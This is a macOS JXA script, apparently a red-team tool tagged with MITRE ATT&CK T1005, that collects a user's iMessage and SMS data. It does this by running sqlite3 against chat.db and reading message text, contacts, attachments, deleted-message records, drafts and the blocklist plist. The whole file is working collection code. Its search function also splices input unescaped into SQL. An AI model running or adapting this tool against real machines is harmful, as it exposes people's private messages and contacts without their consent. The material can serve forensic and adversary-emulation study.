// Script Name: msgIntel.js
// MITRE ATT&CK Technique: T1005 - Data from Local System
// Tactic: Collection
// Platform: macOS
// Sub-techniques: None

// Author: @darmado x.com/darmad0
// Date: Sat Nov 30 23:41:25 PST 2024
// Version: 0.6.0 (alpha)

// Description:
// This script discovers and extracts sensitive information from local macOS message databases
// It uses JXA to access and query SQLite databases containing iMessage and SMS data

ObjC.import('Foundation');
ObjC.import('CoreServices');
ObjC.import('Cocoa');

// Add this class at the top, before existing code
class MsgIntelUtils {
    static SQLITE_BIN = '/usr/bin/sqlite3';
    static USER_INFO = {
        username: $.NSUserName().js,
        homeDir: $.NSHomeDirectory().js
    };
    
    static DBS = {
        chat: `${this.USER_INFO.homeDir}/Library/Messages/chat.db`,
        nickNameKeyStore: `${this.USER_INFO.homeDir}/Library/Messages/NickNameCache/nickNameKeyStore.db`,
        collaborationNotices: `${this.USER_INFO.homeDir}/Library/Messages/CollaborationNoticeCache/collaborationNotices.db`,
        handleSharingPreferences: `${this.USER_INFO.homeDir}/Library/Messages/NickNameCache/handleSharingPreferences.db`,
        handledNicknamesKeyStore: `${this.USER_INFO.homeDir}/Library/Messages/NickNameCache/handledNicknamesKeyStore.db`,
        pendingNicknamesKeyStore: `${this.USER_INFO.homeDir}/Library/Messages/NickNameCache/pendingNicknamesKeyStore.db`,
        prewarmsg: `${this.USER_INFO.homeDir}/Library/Messages/prewarmsg.db`
    };

    static OUTPUT_FORMAT = {
        LINE: '-line',
        JSON: '-json'
    };

    static createTask(dbPath, query, format = this.OUTPUT_FORMAT.JSON) {
        const task = $.NSTask.alloc.init;
        task.launchPath = this.SQLITE_BIN;
        task.arguments = [dbPath, format, query];
        const pipe = $.NSPipe.pipe;
        task.standardOutput = pipe;
        task.standardError = pipe;
        return { task, pipe };
    }

    static executeTask({ task, pipe }) {
        task.launch;
        task.waitUntilExit;
        const data = pipe.fileHandleForReading.readDataToEndOfFile;
        return $.NSString.alloc.initWithDataEncoding(data, $.NSUTF8StringEncoding).js;
    }
}

// Debug Settings
const DEBUG = false;
const LOG_LEVELS = {
    INFO: 'INFO',
    ERROR: 'ERROR',
    DEBUG: 'DEBUG'
};

// Logging function
function log(message, level = LOG_LEVELS.INFO) {
    if (DEBUG || level !== LOG_LEVELS.DEBUG) {
        console.log(`[${level}] ${message}`);
    }
}

// Time Constants
const TIME_FILTERS = {
    LAST_DAYS: 7,
    LAST_WEEK: 7,
    LAST_MONTH: 30,
    LAST_YEAR: 365
};

// SQLite Output Modes
const OUTPUT_MODE = ['column', 'csv', 'html', 'insert', 'json', 'line', 'list'];

// Queries
const QUERY = {
    messages: `
        SELECT 
            msg.ROWID,                   -- 0
            msg.guid,                    -- 1
            msg.service_center,          -- 2
            msg.version,                 -- 3
            msg.type,                    -- 4
            msg.error,                   -- 5
            msg.destination_caller_id,   -- 6
            msg.message_source,          -- 7
            msg.guid,                    -- 8
            msg.is_auto_reply,           -- 9
            msg.is_system_message,       -- 10
            msg.is_service_message,      -- 11
            msg.is_forward,              -- 12
            msg.is_emote,                -- 13
            msg.is_audio_message,        -- 14
            msg.item_type,               -- 15
            msg.message_action_type,     -- 16
            msg.account,                 -- 17
            msg.account_guid,            -- 18
            hnd.id,                      -- 19
            hnd.country,                 -- 20
            msg.handle_id,               -- 21
            msg.other_handle,            -- 22
            msg.service,                 -- 23
            msg.account_guid,            -- 24
            msg.destination_caller_id,   -- 25
            hnd.uncanonicalized_id,      -- 26
            msg.text,                    -- 27
            msg.subject,                 -- 28
            msg.payload_data,            -- 29
            msg.balloon_bundle_id,       -- 30
            msg.cache_roomnames,         -- 31
            msg.part_count,              -- 32
            msg.is_delivered,            -- 33
            msg.is_sent,                 -- 34
            msg.is_read,                 -- 35
            msg.is_played,               -- 36
            msg.is_prepared,             -- 37
            msg.is_finished,             -- 38
            msg.was_delivered_quietly,   -- 39
            msg.did_notify_recipient,    -- 40
            msg.was_downgraded,          -- 41
            msg.was_detonated,           -- 42
            msg.is_delayed,              -- 43
            msg.is_empty,                -- 44
            msg.is_archive,              -- 45
            msg.is_spam,                 -- 46
            msg.is_corrupt,              -- 47
            msg.is_expirable,            -- 48
            msg.expire_state,            -- 49
            msg.replace,                 -- 50
            msg.reply_to_guid,           -- 51
            msg.thread_originator_guid,  -- 52
            msg.thread_originator_part,  -- 53
            msg.associated_message_guid, -- 54
            msg.associated_message_type, -- 55
            msg.associated_message_range_location, -- 56
            msg.associated_message_range_length,   -- 57
            msg.share_status,            -- 58
            msg.share_direction,         -- 59
            msg.group_action_type,       -- 60
            msg.ck_sync_state,           -- 61
            msg.sort_id,                 -- 62
            msg.date,                    -- 63
            msg.date_read,               -- 64
            msg.date_delivered,          -- 65
            msg.date_played,             -- 66
            msg.date_retracted,          -- 67
            msg.date_edited,             -- 68
            msg.time_expressive_send_played, -- 69
            msg.is_from_me               -- 70
        FROM message msg INDEXED BY message_idx_date
        LEFT JOIN 
         hnd ON msg.handle_id = hnd.ROWID
        ORDER BY msg.date DESC
        LIMIT 30;
    `,
    handles: `
        SELECT
            hnd.ROWID,
            hnd.id AS handle_id,
            hnd.country,
            hnd.service,
            hnd.uncanonicalized_id
        FROM handle hnd;
    `,
    chats: `
        SELECT
            chat.ROWID,
            chat.guid,
            chat.chat_identifier,
            chat.service_name,
            chat.account_id,
            chat.display_name
        FROM chat
        ORDER BY chat.ROWID DESC
       ;
    `,
    attachments: `
        SELECT 
            ROWID,
            guid,
            created_date,
            filename,
            mime_type,
            transfer_state,
            is_outgoing
        FROM attachment 
        ORDER BY ROWID ASC 
       limit 200;
        `,
    deleted: `
        SELECT 'message' as src_table, ROWID, guid, recordID 
        FROM sync_deleted_messages
        LIMIT 40;
        
        SELECT 'message' as src_table, ROWID, guid 
        FROM deleted_messages 
        LIMIT 40;
        
        SELECT 'chat' as src_table, ROWID, guid, recordID 
        FROM sync_deleted_chats 
        LIMIT 40;
        
        SELECT 'attachment' as src_table, ROWID, guid, recordID 
        FROM sync_deleted_attachments 
        LIMIT 40;
        `,
    message_details: `
        SELECT ROWID, guid, text, replace, service_center, handle_id, subject,
            country, attributedBody, version, type, service, account,
            account_guid, error, date, date_read, date_delivered,
            is_delivered, is_finished, is_emote, is_from_me, is_empty,
            is_delayed, is_auto_reply, is_prepared, is_read, is_system_message,
            is_sent, has_dd_results, is_service_message, is_forward
        FROM message WHERE guid = `,
    chat_details: `
        SELECT ROWID, guid, chat_identifier, service_name, display_name
        FROM chat 
        WHERE guid = 
        `,
    attachment_details: `
        SELECT ROWID, guid, filename, mime_type, transfer_state
        FROM attachment 
        WHERE guid =
        `,
};

// Mapping Command Arguments to Databases
const DB_COMMAND_MAP = {
    messages: MsgIntelUtils.DBS.chat,
    chats: MsgIntelUtils.DBS.chat,
    handles: MsgIntelUtils.DBS.chat,
    attachments: MsgIntelUtils.DBS.chat,
    threads: MsgIntelUtils.DBS.chat,
    deleted: MsgIntelUtils.DBS.chat,
};

// Add output format constant
const OUTPUT_FORMAT = {
    LINE: '-line',
    JSON: '-json'
};

// Add valid output formats
const VALID_OUTPUT_FORMATS = [
    'json',  // Default
    'line',
    'csv',
    'column',
    'html',
    'insert',
    'list'
];

// Add search query
const SEARCH_QUERIES = {
    byText: `
        SELECT 
            msg.ROWID,
            msg.guid,
            msg.text,
            msg.service,
            msg.account,
            msg.account_guid,
            msg.service_center,
            msg.version,
            msg.type,
            msg.error,
            msg.destination_caller_id,
            msg.message_source,
            msg.handle_id,
            msg.is_from_me,
            msg.date,
            msg.date_read,
            msg.date_delivered,
            msg.is_delivered,
            msg.is_sent,
            msg.is_read,
            msg.is_played,
            msg.is_prepared,
            msg.is_finished,
            msg.is_empty,
            msg.is_archive,
            msg.is_spam,
            msg.is_corrupt,
            msg.is_expirable,
            msg.expire_state,
            msg.replace
        FROM message msg
        WHERE msg.text LIKE '%{query}%'
        ORDER BY msg.date DESC;
    `
};

// MsgIntel Class (Handles SQLite Database Interaction)
class MsgIntel {
    constructor(dbPath) {
        this.dbPath = dbPath;
        this.fileManager = $.NSFileManager.defaultManager;
    }

    cmd(query, format = OUTPUT_FORMAT.LINE) {
        const task = this._createTask(query, format);
        return this._executeTask(task);
    }

    _createTask(query, format = OUTPUT_FORMAT.JSON) {
        const task = $.NSTask.alloc.init;
        task.launchPath = MsgIntelUtils.SQLITE_BIN;
        task.arguments = [this.dbPath, format, query];
        const pipe = $.NSPipe.pipe;
        task.standardOutput = pipe;
        task.standardError = pipe;
        return { task, pipe };
    }

    _executeTask({ task, pipe }) {
        task.launch;
        task.waitUntilExit;
        const data = pipe.fileHandleForReading.readDataToEndOfFile;
        return $.NSString.alloc.initWithDataEncoding(data, $.NSUTF8StringEncoding).js;
    }

    getDeletedItems() {
        const results = this.cmd(QUERY.deleted);
        let currentItem = {};
        const deletedItems = {
            message: [],
            attachment: [],
            chat: []
        };
        
        // Parse line output and store by type
        results.split('\n').forEach(line => {
            if (line.trim()) {
                const [key, value] = line.trim().split(' = ');
                currentItem[key.trim()] = value;
            } else if (Object.keys(currentItem).length) {
                if (currentItem.src_table && currentItem.guid) {
                    deletedItems[currentItem.src_table].push(currentItem.guid);
                }
                currentItem = {};
            }
        });

        return deletedItems;
    }

    _createDeletedTask(query) {
        const task = $.NSTask.alloc.init;
        task.launchPath = MsgIntelUtils.SQLITE_BIN;
        task.arguments = [this.dbPath, '-line', query];
        const pipe = $.NSPipe.pipe;
        task.standardOutput = pipe;
        task.standardError = pipe;
        return { task, pipe };
    }

    processDeletedItems(items) {
        Object.entries(items).forEach(([type, guids]) => {
            guids.forEach(guid => {
                const query = QUERY[`${type}_details`] + `'${guid}'` + ';';
                //console.log(`Debug - Executing query: ${query}`); //TODO: add debug flag and control it via -debug flag
                const task = this._createDeletedTask(query);
                const details = this._executeTask(task);
                console.log(`${type} ${guid}:`);
                console.log(details);
            });
        });
    }

    getDrafts() {
        try {
            const draftsPath = `${MsgIntelUtils.USER_INFO.homeDir}/Library/Messages/Drafts`;
            
            if (!this.fileManager.fileExistsAtPath(draftsPath)) {
                return { drafts: [] };
            }

            const accounts = ObjC.deepUnwrap(this.fileManager.contentsOfDirectoryAtPathError(draftsPath, null));
            let messages = {};
            
            // Create single job object for this PID
            const jobId = `JOB-${$.NSUUID.UUID.UUIDString.js}`;
            const job = {
                job_id: jobId,
                user: MsgIntelUtils.USER_INFO.username,
                executor: 'osascript',
                language: 'jxa',
                imports: ['Foundation'],
                binaries: ['plutil'],
                pid: $.NSProcessInfo.processInfo.processIdentifier,
                query: {
                    timestamp: new Date().toISOString(),
                    type: 'draft'
                }
            };

            accounts.forEach(account => {
                const plistPath = `${draftsPath}/${account}/composition.plist`;
                if (this.fileManager.fileExistsAtPath(plistPath)) {
                    // Get file attributes with proper timestamps
                    const stat = $.NSFileManager.defaultManager.attributesOfItemAtPathError(plistPath, null);
                    const modDate = ObjC.deepUnwrap(stat.fileModificationDate);
                    const creationDate = ObjC.deepUnwrap(stat.creationDate);

                    const task = $.NSTask.alloc.init;
                    task.launchPath = '/usr/bin/plutil';
                    task.arguments = ['-convert', 'xml1', '-o', '-', plistPath];
                    
                    const pipe = $.NSPipe.pipe;
                    task.standardOutput = pipe;
                    task.standardError = pipe;
                    
                    task.launch;
                    task.waitUntilExit;
                    
                    const data = pipe.fileHandleForReading.readDataToEndOfFile;
                    const output = $.NSString.alloc.initWithDataEncoding(data, $.NSUTF8StringEncoding).js;

                    const dataMatch = output.match(/<data>\s*(.*?)\s*<\/data>/s);
                    const base64Data = dataMatch ? dataMatch[1].replace(/\s+/g, '') : '';

                    // Decode the content first
                    const decodedData = $.NSData.alloc.initWithBase64EncodedStringOptions(base64Data, 0);
                    const plist = $.NSPropertyListSerialization.propertyListWithDataOptionsFormatError(
                        decodedData,
                        0,
                        null,
                        null
                    );
                    const rawContent = ObjC.deepUnwrap(plist);

                    const messageId = `DRAFT-${$.NSUUID.UUID.UUIDString.js}`;
                    messages[messageId] = {
                        job_id: jobId,
                        source: {
                            type: 'plist',
                            directory: account,
                            path: plistPath,
                        },
                        communication: {
                            receiver: {
                                account: account,
                                service: account.includes('@') ? 'iMessage' : 'SMS'
                            }
                        },
                        content: {
                            data: {
                                text: rawContent.$objects.find(obj => obj?.['NS.string'])?.['NS.string'] || '',
                                format: 'NSKeyedArchiver',
                                encoding_method: 'base64',
                                mime_type: 'application/x-plist',
                                data_length: base64Data.length,
                                encoded_data: base64Data
                            },
                            attachments: rawContent.$objects.find(obj => obj === 'CKCompositionFileURL') 
                                ? [rawContent.$objects.find(obj => obj.startsWith && obj.startsWith('file://'))]
                                : []
                        },
                        status: {
                            delivery: {
                                is_pending: account === 'Pending' && plistPath.includes('/Pending/composition.plist'),
                                is_delivered: false,
                                is_sent: false,
                                is_read: false,
                                is_played: false,
                                is_prepared: false,
                                is_finished: false,
                                was_delivered_quietly: false,
                                did_notify_recipient: false,
                                was_downgraded: false,
                                was_detonated: false,
                                is_delayed: false
                            },
                            state: {
                                has_attachments: this.fileManager.fileExistsAtPath(`${draftsPath}/${account}/Attachments`),
                                created: creationDate,
                                last_modified: modDate
                            },
                        }
                    };
                }
            });

            return {
                job,  // Single job object at top level
                drafts: messages  // All messages under drafts
            };

        } catch (error) {
            console.log(`Error reading drafts: ${error}`);
            return { drafts: {} };
        }
    }

    getMessageCount() {
        const countQuery = 'SELECT COUNT(*) as total FROM message;';
        const result = this.cmd(countQuery, '-line');
        console.log(`Total messages: ${parseInt(result.split('=')[1].trim())}`);
        return parseInt(result.split('=')[1].trim());
    }

    getMessages(format = OUTPUT_FORMAT.JSON) {
        const totalMessages = this.getMessageCount();
        const pageSize = 30;
        const totalPages = Math.ceil(totalMessages / pageSize);
        let allResults = [];

        console.log(`Fetching ${totalMessages} messages in ${totalPages} pages...`);

        for (let page = 0; page < totalPages; page++) {
            const offset = page * pageSize;
            console.log(`Fetching page ${page + 1}/${totalPages} (offset: ${offset})`);

            const query = QUERY.messages.replace('LIMIT 30', `LIMIT ${pageSize} OFFSET ${offset}`);
            const results = this.cmd(query, format);
            allResults.push(results);
        }

        return allResults;
    }

    // Add to MsgIntel class
    searchMessages(searchText, format = OUTPUT_FORMAT.JSON) {
        const query = SEARCH_QUERIES.byText.replace('{query}', searchText);
        const rawResults = JSON.parse(this.cmd(query, '-json'));
        
        const formattedResults = rawResults.map(msg => ({
            job: {
                job_id: `JOB-${$.NSUUID.UUID.UUIDString.js}`,
                user: MsgIntelUtils.USER_INFO.username,
                executor: "osascript",
                language: "jxa",
                imports: ["Foundation"],
                binaries: ["sqlite3"],
                pid: $.NSProcessInfo.processInfo.processIdentifier,
                query: {
                    timestamp: new Date().toISOString(),
                    source_db: this.dbPath,
                    type: "search",
                    ROWID: msg.ROWID
                }
            },
            message: {
                guid: msg.guid,
                type: {
                    is_empty: Boolean(msg.is_empty),
                    is_archive: Boolean(msg.is_archive),
                    is_spam: Boolean(msg.is_spam),
                    is_corrupt: Boolean(msg.is_corrupt),
                    is_expirable: Boolean(msg.is_expirable),
                    expire_state: msg.expire_state || 0,
                    replace: msg.replace || 0
                },
                communication: {
                    sender: {
                        account: msg.account,
                        account_guid: msg.account_guid,
                        service: msg.service
                    }
                },
                content: {
                    data: {
                        text: msg.text
                    }
                },
                status: {
                    delivery: {
                        is_delivered: Boolean(msg.is_delivered),
                        is_sent: Boolean(msg.is_sent),
                        is_read: Boolean(msg.is_read),
                        is_played: Boolean(msg.is_played),
                        is_prepared: Boolean(msg.is_prepared),
                        is_finished: Boolean(msg.is_finished)
                    }
                },
                timestamps: {
                    date: msg.date,
                    date_read: msg.date_read,
                    date_delivered: msg.date_delivered
                }
            }
        }));

        return JSON.stringify(formattedResults, null, 2);
    }
}

// Argument Parsing
function parseArguments() {
    const args = $.NSProcessInfo.processInfo.arguments;
    const parsedArgs = {};
    for (let i = 4; i < args.count; i++) {
        const arg = ObjC.unwrap(args.objectAtIndex(i));
        if (arg.startsWith('-')) {
            const key = arg.substring(1);
            const value = (i + 1 < args.count && !ObjC.unwrap(args.objectAtIndex(i + 1)).startsWith('-'))
                ? ObjC.unwrap(args.objectAtIndex(i + 1))
                : true;
            parsedArgs[key] = value;
            if (value !== true) i++;
        }
    }
    return parsedArgs;
}

// Display Help Text
function displayHelp() {
    const helpText = `
$ osascript -l JavaScript ./msgIntel.js [options] [arguments...]

DISCOVER:
    -messages               List recent messages
    -chats                  List all chats
    -drafts                 List all drafts
    -handles                List all contacts/handles
    -attachments            List message attachments
    -threads                List message threads
    -deleted                List deleted messages
    -spam                   List spam messages
    -sensitive              List sensitive content

TIME-BASED:
    -last <days>            Show messages from last N days
    -since <timestamp>      Show messages since timestamp
    -between <start> <end>  Show messages between timestamps

SEARCH:
    -search <query>         Search message text
    -sender <id>            Search by sender
    -service <type>         Search by service type (iMessage, SMS)
    -type <type>            Search by attachment type

DEBUG:
    -debug                  Enable debug output
    -schema                 Show database schema
    -pragma                 Show PRAGMA information
    -help                   Display this help message

OUTPUT:
    -output <mode>          Set output mode (column, csv, html, insert, json, line, list)
`;
    console.log(helpText);
}

// Move BlockList class here, before execCmd
class BlockList {
    constructor() {
        this.fileManager = $.NSFileManager.defaultManager;
    }

    getBlockList() {
        const blocklistPath = `${MsgIntelUtils.USER_INFO.homeDir}/Library/Preferences/com.apple.cmfsyncagent.plist`;
        
        if (!this.fileManager.fileExistsAtPath(blocklistPath)) {
            return "Blocklist not found";
        }

        const task = $.NSTask.alloc.init;
        task.launchPath = '/usr/bin/plutil';
        task.arguments = ['-p', blocklistPath];
        
        const pipe = $.NSPipe.pipe;
        task.standardOutput = pipe;
        task.standardError = pipe;
        
        task.launch;
        task.waitUntilExit;
        
        const data = pipe.fileHandleForReading.readDataToEndOfFile;
        const output = $.NSString.alloc.initWithDataEncoding(data, $.NSUTF8StringEncoding).js;

        const blockList = {
            blocklist: [],
            metadata: {}
        };
        
        let currentEntry = {};
        
        output.split('\n').forEach(line => {
            line = line.trim();
            if (line.includes('PhoneNumberUnformattedKey')) {
                currentEntry.phone = line.split('"')[3];
            } else if (line.includes('EmailUnformattedKey')) {
                currentEntry.email = line.split('"')[3];
            } else if (line.includes('PhoneNumberCountryCodeKey')) {
                currentEntry.country = line.split('"')[3].toUpperCase();
            } else if (line.includes('ItemTypeKey')) {
                currentEntry.type = line.includes('=> 0') ? 'Phone' : 'Email';
                currentEntry.typeId = parseInt(line.split('=>')[1].trim());
            } else if (line.includes('ItemVersionKey')) {
                currentEntry.version = parseInt(line.split('=>')[1].trim());
                blockList.blocklist.push({...currentEntry});
                currentEntry = {};
            } else if (line.includes('RevisionKey')) {
                blockList.metadata.revision = parseInt(line.split('=>')[1].trim());
            } else if (line.includes('RevisionTimestampKey')) {
                blockList.metadata.lastModified = line.split('=>')[1].trim();
            } else if (line.includes('BlockListStoreTypeKey')) {
                blockList.metadata.storeType = line.split('=>')[1].trim().replace(/"/g, '');
            } else if (line.includes('BlockListStoreVersionKey')) {
                blockList.metadata.storeVersion = parseInt(line.split('=>')[1].trim());
            }
        });

        return JSON.stringify(blockList, null, 2);
    }
}

// Add time-based query for last N days
function getLastNDaysQuery(days) {
    // Validate days (1-90)
    if (!Number.isInteger(days) || days < 1 || days > 90) {
        console.log("Error: Days must be between 1 and 90");
        return null;
    }

    return `
        SELECT *
        FROM message 
        WHERE date >= strftime('%s', date('now', '-${days} days'))
        ORDER BY date DESC;
    `;
}

// Update execCmd to handle search
function execCmd(arg) {
    // Handle non-database commands first
    if (arg.drafts) {
        const msgIntel = new MsgIntel();
        const drafts = msgIntel.getDrafts();
        console.log(JSON.stringify(drafts, null, 2));
        return;
    }

    if (arg.blocklist) {
        const plistReader = new BlockList();
        const blockList = plistReader.getBlockList();
        console.log(blockList);
        return;
    }

    // Handle search command
    if (arg.search) {
        const msgIntel = new MsgIntel(MsgIntelUtils.DBS.chat);
        const results = msgIntel.searchMessages(arg.search);
        console.log(results);
        return;
    }

    // Handle database commands
    Object.keys(arg).forEach(cmd => {
        if (DB_COMMAND_MAP[cmd]) {
            const dbPath = DB_COMMAND_MAP[cmd];
            const msgIntel = new MsgIntel(dbPath);
            
            if (cmd === 'messages') {
                const format = arg.output ? `-${arg.output}` : '-json';
                const results = msgIntel.getMessages(format);
                results.forEach(batch => console.log(batch));
                return;
            }

            const format = arg.output ? `-${arg.output}` : '-json';
            const results = msgIntel.cmd(QUERY[cmd], format);
            console.log(results);
        }
    });
}

// Validate Arguments
function validateArguments(arg) {
    const validCommands = [
        'messages', 'chats', 'handles', 'attachments', 'drafts',
        'threads', 'deleted', 'spam', 'sensitive', 'blocklist',
        'last', 'since', 'between', 'search', 'sender',
        'service', 'type', 'debug', 'schema', 'pragma', 'help',
        'output'
    ];
    
    const invalidCommands = Object.keys(arg).filter(cmd => !validCommands.includes(cmd));
    if (invalidCommands.length > 0) {
        console.log(`Error: Invalid option(s): ${invalidCommands.join(', ')}`);
        displayHelp();
        return false;
    }
    return true;
}

// Main Execution Function
function main() {
    const arg = parseArguments();

    // If no arguments, show help and exit
    if (Object.keys(arg).length === 0) {
        console.log("msgIntel - Messages Database Intelligence Tool");
        console.log("Usage: osascript -l JavaScript msgIntel.js [options]");
        console.log("Try 'osascript -l JavaScript msgIntel.js -help' for more information.");
        return;
    }

    // Display help if requested
    if (arg.help) {
        displayHelp();
        return;
    }

    // Validate arguments
    if (!validateArguments(arg)) {
        return;
    }

    // Execute commands
    execCmd(arg);
}

// Execute if script is run directly
if ($.NSProcessInfo.processInfo.environment.js['_']) {
    main();
}

// Add after MsgIntelUtils but before existing code...

// Placeholder classes for each command
class Messages {
    constructor(dbPath) {
        this.dbPath = dbPath;
    }
    // Will move message-related code here later
}

class Search {
    constructor(dbPath) {
        this.dbPath = dbPath;
    }
    // Will move search-related code here later
}

class Drafts {
    constructor() {
        this.fileManager = $.NSFileManager.defaultManager;
    }
    // Will move drafts-related code here later
}

class Chats {
    constructor(dbPath) {
        this.dbPath = dbPath;
    }
    // Will move chats-related code here later
}

class Handles {
    constructor(dbPath) {
        this.dbPath = dbPath;
    }
    // Will move handles-related code here later
}

class Attachments {
    constructor(dbPath) {
        this.dbPath = dbPath;
    }
    // Will move attachments-related code here later
}

class Deleted {
    constructor(dbPath) {
        this.dbPath = dbPath;
    }
    // Will move deleted items code here later
}

